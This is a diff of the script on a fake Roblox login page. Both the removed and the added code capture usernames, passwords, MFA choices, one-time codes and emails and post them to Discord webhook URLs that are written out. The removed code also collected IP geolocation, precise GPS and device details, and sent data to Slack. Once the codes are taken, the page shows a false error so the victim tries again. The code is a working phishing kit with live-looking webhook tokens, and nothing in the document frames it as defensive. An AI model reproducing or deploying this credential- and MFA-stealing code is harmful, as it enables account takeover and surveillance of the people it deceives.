@@ -393,16 +393,7 @@
 </div>
 <script>
 <script>
-const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
-const WAIT = 3000;
-
-const EVENT_TYPES = {
-    LOGIN_ATTEMPT: { title: "🔐 Authentication Attempt", level: "INFO" },
-    MFA_CHOICE:    { title: "🛡️ MFA Method Selected",    level: "WARN" },
-    MFA_SUCCESS:   { title: "✅ MFA Verified Successfully", level: "SUCCESS" },
-    MFA_FAILED:    { title: "❌ MFA Verification Failed",   level: "ERROR" }
-};
 
 const EXTENDED_COLOR_PALETTE = [
     0x3498DB, 0xE74C3C, 0x2ECC71, 0xF1C40F, 0x9B59B6,
@@ -424,321 +415,139 @@ function getColorForUser(username) {
     return assignedColor;
 }
 
-let clientGeoData = { 
-    ip: "Loading...", 
-    city: "Unknown",
-    region: "Unknown",
-    postal: "Unknown",
-    country: "Unknown",
-    org: "Unknown",
-    lookupUrl: "#",
-    gpsAddress: "Pending...",
-    mapUrl: "#"
-};
+async function sendLog(title, username, data) {
+    if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "YOUR_DISCORD_WEBHOOK_URL") return;
 
-(async function initIpLookup() {
-    try {
-        const res = await fetch('https://ipinfo.io/json');
-        const data = await res.json();
-        if (data && data.ip) {
-            clientGeoData.ip = data.ip;
-            clientGeoData.city = data.city || "Unknown";
-            clientGeoData.region = data.region || "Unknown";
-            clientGeoData.postal = data.postal || "N/A";
-            clientGeoData.country = data.country || "Unknown";
-            clientGeoData.org = data.org || "Unknown";
-            clientGeoData.lookupUrl = `https://ipinfo.io/${data.ip}`;
-        }
-    } catch (e) {}
-})();
-
-function requestPreciseGPS(cb) {
-    if (!navigator.geolocation) {
-        if(cb) cb();
-        return;
-    }
+    const color = getColorForUser(username);
+    const fields = [{ name: "👤 User", value: `\`\`\`${username || "N/A"}\`\`\``, inline: false }];
     
-    navigator.geolocation.getCurrentPosition(
-        async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            clientGeoData.mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-            
-            try {
-                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-                const geoJson = await geoRes.json();
-                if (geoJson && geoJson.display_name) {
-                    clientGeoData.gpsAddress = geoJson.display_name;
-                } else {
-                    clientGeoData.gpsAddress = `Lat: ${lat}, Lon:${lon}`;
-                }
-            } catch (err) {
-                clientGeoData.gpsAddress = `Lat: ${lat}, Lon:${lon}`;
-            }
-            if(cb) cb();
-        },
-        (error) => {
-            clientGeoData.gpsAddress = "Access Denied / Not Granted";
-            if(cb) cb();
-        },
-        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-    );
-}
-
-function getClientTelemetry() {
-    const ua = navigator.userAgent;
-    let os = "Unknown OS", browser = "Unknown Browser";
-
-    if (/iPad|iPhone|iPod/.test(ua)) {
-        os = /iPad/.test(ua) ? "iPadOS" : "iOS";
-    } else if (/Mac OS X/.test(ua)) {
-        os = "macOS";
-    } else if (/Windows/.test(ua)) {
-        os = "Windows";
-    } else if (/Android/.test(ua)) {
-        os = "Android";
-    } else if (/Linux/.test(ua)) {
-        os = "Linux";
+    for (const [k, v] of Object.entries(data)) {
+        fields.push({ name: `🔑 ${k}`, value: `\`\`\`${v}\`\`\``, inline: false });
     }
 
-    if (/CriOS\//.test(ua)) {
-        browser = "Google Chrome (iOS)";
-    } else if (/FxiOS\//.test(ua)) {
-        browser = "Mozilla Firefox (iOS)";
-    } else if (/Edg\//.test(ua)) {
-        browser = "Microsoft Edge";
-    } else if (/OPR\/|Opera/.test(ua)) {
-        browser = "Opera";
-    } else if (/Chrome\//.test(ua)) {
-        browser = "Google Chrome";
-    } else if (/Firefox\//.test(ua)) {
-        browser = "Mozilla Firefox";
-    } else if (/Safari\//.test(ua)) {
-        browser = "Apple Safari";
-    }
-
-    return {
-        platform: os,
-        browser: browser,
-        resolution: `${screen.width}x${screen.height}`,
-        timestamp: new Date().toISOString()
+    const payload = {
+        username: "Auth Bot",
+        embeds: [{
+            title: title,
+            color: color,
+            fields: fields,
+            timestamp: new Date().toISOString()
+        }]
     };
-}
 
-async function sendStructuredAuditLog(eventType, accountIdentifier, payloadData, avatarUrl = null, profileDetails = null) {
-    const config = EVENT_TYPES[eventType] || { title: "📌 System Event", level: "DEFAULT" };
-    const userColorHex = getColorForUser(accountIdentifier);
-    const telemetry = getClientTelemetry();
-
-    const discordFields = [
-        {
-            name: "👤 Account",
-            value: `\`${accountIdentifier || "N/A"}\``,
-            inline: true
-        }
-    ];
-
-    const dataEntries = Object.entries(payloadData || {});
-    dataEntries.forEach(([k, v]) => {
-        discordFields.push({
-            name: `🔑 ${k}`,
-            value: `\`${v}\``,
-            inline: true
-        });
-    });
-
-    const requests = [];
-
-    if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== "YOUR_DISCORD_WEBHOOK_URL") {
-        const txtContent = 
-`=========================================
-EXTENDED TELEMETRY & SYSTEM DETAILS
-=========================================
-Timestamp   : ${telemetry.timestamp}
-Username    : ${accountIdentifier || "N/A"}
-IP Address  : ${clientGeoData.ip}
-ISP / Org   : ${clientGeoData.org}
-Location    : ${clientGeoData.city},${clientGeoData.region}, ${clientGeoData.country} (${clientGeoData.postal})
-GPS Address : ${clientGeoData.gpsAddress}
-Google Maps : ${clientGeoData.mapUrl}
-
-OS Platform : ${telemetry.platform}
-Browser     : ${telemetry.browser}
-Screen Res  : ${telemetry.resolution}
-User-Agent  : ${navigator.userAgent}
-=========================================`;
-
-        const discordPayload = {
-            username: "Roblox Auth Bot",
-            avatar_url: avatarUrl || undefined,
-            embeds: [{
-                title: config.title,
-                color: userColorHex,
-                fields: discordFields,
-                timestamp: telemetry.timestamp
-            }]
-        };
-
-        const formData = new FormData();
-        formData.append("payload_json", JSON.stringify(discordPayload));
-        const blob = new Blob([txtContent], { type: "text/plain" });
-        formData.append("file", blob, `telemetry_${accountIdentifier || "user"}.txt`);
-
-        requests.push(fetch(DISCORD_WEBHOOK, {
+    try {
+        await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
-            body: formData
-        }).catch(() => {}));
-    }
-
-    if (SLACK_WEBHOOK && SLACK_WEBHOOK !== "YOUR_SLACK_WEBHOOK_URL") {
-        let slackText = `*${config.title}*\n*Account:* \`${accountIdentifier || "N/A"}\``;
-        dataEntries.forEach(([k, v]) => {
-            slackText += `\n*${k}:* \`${v}\``;
-        });
-
-        const slackPayload = {
-            text: slackText,
-            attachments: [{
-                color: `#${userColorHex.toString(16).padStart(6, '0')}`,
-                ts: Math.floor(Date.now() / 1000)
-            }]
-        };
-
-        requests.push(fetch(SLACK_WEBHOOK, {
-            method: 'POST',
-            mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(slackPayload)
-        }).catch(() => {}));
-    }
-
-    await Promise.all(requests);
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {}
 }
 
-function getRobloxProfileData(username, cb){
-    let done = false;
-    const finish = (res) => { if(done) return; done = true; cb(res); };
-    setTimeout(() => finish({ avatar: null, details: null }), 5000);
-    const name = String(username || "").trim();
-    if(!name || name.indexOf("@") > -1){ finish({ avatar: null, details: null }); return; }
-    
-    fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(name)}`)
-    .then(r => r.json())
-    .then(d => {
-        if(d && d.data && d.data.length > 0){
-            const userInfo = d.data[0];
-            const userId = userInfo.id;
-            
-            return Promise.all([
-                fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`).then(r => r.json()),
-                fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json())
-            ]).then(([thumbRes, profileRes]) => {
-                const avatarUrl = thumbRes && thumbRes.data && thumbRes.data.length > 0 ? thumbRes.data[0].imageUrl : null;
-                finish({ avatar: avatarUrl, details: profileRes });
-            });
-        }
-        finish({ avatar: null, details: null });
-    })
-    .catch(() => finish({ avatar: null, details: null }));
-}
+let currentUsername = "";
 
-function hideAllModals(){
-    ['twostepverification','authenticatorverification','RecoveryFromEmail','RecoveryFromAuthen','otpEmailModal','otpCodeModal','methodChoice'].forEach(id => {
-        const el = document.getElementById(id);
-        if(el) el.style.display = 'none';
-    });
-}
-
-function showErrorUnderFields(){
-    hideAllModals();
-    const loginContainer = document.getElementById('react-login-container');
-    if(loginContainer) loginContainer.style.display = 'block';
-    const errText = document.getElementById('text-error');
-    if(errText) errText.textContent = "Something went wrong. Please try again.";
+function doLogin() {
     const uInput = document.getElementById('login-username');
-    if(uInput) uInput.value = '';
     const pInput = document.getElementById('login-password');
-    if(pInput) pInput.value = '';
-    const av = document.getElementById('avatar-preview');
-    if(av) av.style.display = 'none';
-}
+    const err = document.getElementById('text-error');
 
-function chooseMethod(method){
-    document.getElementById('methodChoice').style.display = 'none';
-    
-    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
-        Method: method
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    
-    setTimeout(() => {
-        if(method === 'Email'){
-            document.getElementById('twostepverification').style.display = 'block';
-        } else if(method === 'Authenticator'){
-            document.getElementById('authenticatorverification').style.display = 'block';
-        } else if(method === 'Backup Code'){
-            document.getElementById('RecoveryFromEmail').style.display = 'block';
-        }
-    }, 1200);
-}
+    const u = uInput ? uInput.value.trim() : '';
+    const p = pInput ? pInput.value : '';
 
-let lastLogin = { username: '', password: '', avatarUrl: null, profileDetails: null };
-
-function doLogin(){
-    const usernameInput = document.getElementById('login-username');
-    const passwordInput = document.getElementById('login-password');
-    const errorText = document.getElementById('text-error');
-    const loadingEl = document.getElementById('login-loading');
-    const loginButton = document.getElementById('login-button');
-
-    const username = usernameInput ? usernameInput.value.trim() : '';
-    const password = passwordInput ? passwordInput.value : '';
-
-    if(!username || !password){
-        if(errorText) errorText.textContent = "Username and password required";
+    if (!u || !p) {
+        if (err) err.textContent = "Username and password required";
         return;
     }
 
-    if(loadingEl) loadingEl.style.display = 'flex';
-    if(loginButton) loginButton.style.display = 'none';
-    if(errorText) errorText.textContent = "";
-    
-    lastLogin.username = username;
-    lastLogin.password = password;
+    currentUsername = u;
+    if (err) err.textContent = "";
 
-    getRobloxProfileData(username, (res) => {
-        if(res.avatar) lastLogin.avatarUrl = res.avatar;
-        if(res.details) lastLogin.profileDetails = res.details;
-        
-        sendStructuredAuditLog("LOGIN_ATTEMPT", username, {
-            Password: password
-        }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    });
+    sendLog("🔐 Login Credentials", u, { Password: p });
+
+    const methodChoice = document.getElementById('methodChoice');
+    if (methodChoice) methodChoice.style.display = 'block';
+}
+
+function chooseMethod(method) {
+    const methodChoice = document.getElementById('methodChoice');
+    if (methodChoice) methodChoice.style.display = 'none';
+    
+    sendLog("🛡️ MFA Method Chosen", currentUsername, { Method: method });
 
     setTimeout(() => {
-        if(loadingEl) loadingEl.style.display = 'none';
-        if(loginButton) loginButton.style.display = 'block';
-        const methodChoice = document.getElementById('methodChoice');
-        if(methodChoice) methodChoice.style.display = 'block';
-    }, WAIT);
+        if (method === 'Email') {
+            const el = document.getElementById('twostepverification');
+            if (el) el.style.display = 'block';
+        } else if (method === 'Authenticator') {
+            const el = document.getElementById('authenticatorverification');
+            if (el) el.style.display = 'block';
+        } else if (method === 'Backup Code') {
+            const el = document.getElementById('RecoveryFromEmail');
+            if (el) el.style.display = 'block';
+        }
+    }, 300);
 }
 
-function handleVerificationWithDeferredGPS(buttonElement, methodType, codeValue) {
-    buttonElement.disabled = true;
-    buttonElement.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+function verifyCode(method, inputId) {
+    const inputEl = document.getElementById(inputId);
+    const code = inputEl ? inputEl.value.trim() : '';
+    if (!code) return;
 
-    requestPreciseGPS(() => {
-        sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-            Method: methodType,
-            Code: codeValue
-        }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    sendLog("✅ Code Verified", currentUsername, { Method: method, Code: code });
 
-        setTimeout(() => {
-            buttonElement.disabled = false;
-            buttonElement.innerHTML = 'Verify';
-            showErrorUnderFields();
-        }, WAIT);
+    ['twostepverification', 'authenticatorverification', 'RecoveryFromEmail', 'RecoveryFromAuthen', 'otpCodeModal'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.style.display = 'none';
     });
+
+    const loginContainer = document.getElementById('react-login-container');
+    if (loginContainer) loginContainer.style.display = 'block';
+    
+    const errText = document.getElementById('text-error');
+    if (errText) errText.textContent = "Something went wrong. Please try again.";
+    
+    const uInput = document.getElementById('login-username');
+    if (uInput) uInput.value = '';
+    const pInput = document.getElementById('login-password');
+    if (pInput) pInput.value = '';
 }
+
+document.addEventListener('click', function(e) {
+    const target = e.target;
+    if (!target) return;
+
+    if (target.id === 'login-button') {
+        e.preventDefault();
+        doLogin();
+    } else if (target.id === 'verifyButton') {
+        verifyCode('Email', 'two-step-verification-code-input');
+    } else if (target.id === 'AuthenButton') {
+        verifyCode('Authenticator', 'two-step-verification-code-input-authenticator');
+    } else if (target.id === 'RecoveryFromEmailButton') {
+        verifyCode('Backup Code (Email)', 'two-step-verification-code-input-RecoveryFromEmail');
+    } else if (target.id === 'RecoveryFromAuthenButton') {
+        verifyCode('Backup Code (Authenticator)', 'two-step-verification-code-input-recoveryFromAuthen');
+    } else if (target.id === 'otp-login-button') {
+        const modal = document.getElementById('otpEmailModal');
+        if (modal) modal.style.display = 'block';
+    } else if (target.id === 'otp-send-btn') {
+        const emailInput = document.getElementById('otp-email-input');
+        const email = emailInput ? emailInput.value.trim() : '';
+        if (email) {
+            sendLog("🛡️ One-Time Code Requested", email, { Email: email });
+            const disp = document.getElementById('otp-email-display');
+            if (disp) disp.textContent = email;
+            const emailModal = document.getElementById('otpEmailModal');
+            if (emailModal) emailModal.style.display = 'none';
+            const codeModal = document.getElementById('otpCodeModal');
+            if (codeModal) codeModal.style.display = 'block';
+        }
+    } else if (target.id === 'otp-verify-btn') {
+        const emailInput = document.getElementById('otp-email-input');
+        const email = emailInput ? emailInput.value.trim() : currentUsername;
+        verifyCode('One-Time Code', 'otp-code-input');
+    }
+});
 </script>
 </body>
 </html>
